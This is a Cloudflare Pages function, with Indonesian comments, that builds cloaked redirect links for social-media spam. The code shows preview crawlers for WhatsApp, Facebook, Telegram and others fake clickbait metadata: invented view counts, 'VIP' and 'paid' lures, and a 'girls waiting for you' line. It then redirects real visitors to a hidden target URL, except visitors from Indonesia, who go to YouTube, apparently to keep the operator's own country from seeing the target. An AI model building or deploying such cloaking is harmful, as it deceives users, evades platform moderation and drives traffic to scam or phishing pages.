export async function onRequest(context) {
    const { params, request } = context;
    const base64Data = params.path[0];
    const userAgent = request.headers.get("user-agent") || "";
    
    // Deteksi Negara (Fitur bawaan Cloudflare)
    const country = request.cf ? request.cf.country : "Unknown";

    if (!base64Data || base64Data === "index.html") {
        return context.next();
    }

    try {
        const data = JSON.parse(atob(base64Data));
        const title = data.t || "Premium Content";
        const image = data.i || "";
        const target = data.u || "";

        const count = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
        const formattedCount = count.toLocaleString('en-US');
        
        const themes = [
            { t: `▶️ [PLAY] ${title}`, d: `🎬 Full Video (04:22) - ${formattedCount} views`, type: "video.other" },
            { t: `💰 [PAID] ${title}`, d: `💳 Unlock Content: $5.00 - Access for ${formattedCount} members`, type: "website" },
            { t: `💎 [VIP] ${title}`, d: `🔓 Exclusive access for ${formattedCount} girls waiting for you`, type: "website" },
            { t: `🔴 [LIVE] ${title}`, d: `👥 ${formattedCount} people are watching this live now!`, type: "video.other" },
            { t: `📥 [DOWNLOAD] ${title}`, d: `💾 File Size: 14.5 MB - ${formattedCount} total downloads`, type: "website" }
        ];
        
        const s = themes[Math.floor(Math.random() * themes.length)];
        const isBot = /WhatsApp|facebookexternalhit|TelegramBot|Twitterbot|Slackbot/i.test(userAgent);

        // 1. Tampilan untuk Bot (Agar Preview Muncul)
        if (isBot) {
            return new Response(`<!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>${s.t}</title>
                <meta property="og:title" content="${s.t}" />
                <meta property="og:description" content="${s.d}" />
                <meta property="og:image" content="${image}" />
                <meta property="og:type" content="${s.type}" />
                <meta property="og:video:url" content="${image}" /> 
                <meta property="og:video:type" content="text/html" />
                <meta name="twitter:card" content="summary_large_image">
            </head>
            <body></body>
            </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
        }

        // 2. LOGIC REDIRECT BERDASARKAN NEGARA
        let finalTarget = target.trim();
        
        // Jika pengunjung dari INDONESIA (ID), arahkan ke YouTube
        if (country === "ID") {
            finalTarget = "https://www.youtube.com"; 
        } else {
            // Jika luar Indonesia, arahkan ke target asli
            if (!/^https?:\/\//i.test(finalTarget)) {
                finalTarget = 'https://' + finalTarget;
            }
        }

        return Response.redirect(finalTarget, 302);

    } catch (e) {
        return context.next();
    }
}
